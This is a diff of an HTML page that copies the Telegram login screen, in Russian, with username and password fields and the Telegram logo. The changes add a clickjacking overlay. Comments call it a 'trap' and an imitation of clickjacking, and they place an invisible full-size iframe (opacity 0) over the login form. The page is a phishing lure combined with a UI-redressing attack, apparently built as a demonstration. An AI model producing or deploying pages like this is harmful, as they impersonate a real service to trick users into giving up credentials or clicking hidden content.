@@ -24,6 +24,7 @@
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             width: 320px;
+            position: relative;
         }
 
         .logo {
@@ -63,6 +64,7 @@
             background-color: #0077b3;
         }
 
+        /* Имитируем Clickjacking */
         .hidden-iframe {
             position: absolute;
             top: 0;
@@ -72,11 +74,18 @@
             opacity: 0;
             z-index: 2;
         }
+
+        /* Ловушка: размещаем невидимый iframe поверх формы */
+        .trap {
+            position: relative;
+            display: inline-block;
+        }
+
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <div class="container trap">
         <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
         <h2>Вход в Telegram</h2>
         <div class="input-group">
@@ -84,10 +93,10 @@
             <input type="password" placeholder="Пароль">
             <button>Войти</button>
         </div>
-    </div>
 
-    <!-- Скрытый iframe -->
-    <iframe class="hidden-iframe" src="https://web.telegram.org/"></iframe>
+        <!-- Ловушка: iframe -->
+        <iframe class="hidden-iframe" src="https://example.com"></iframe>
+    </div>
 
 </body>
 </html>
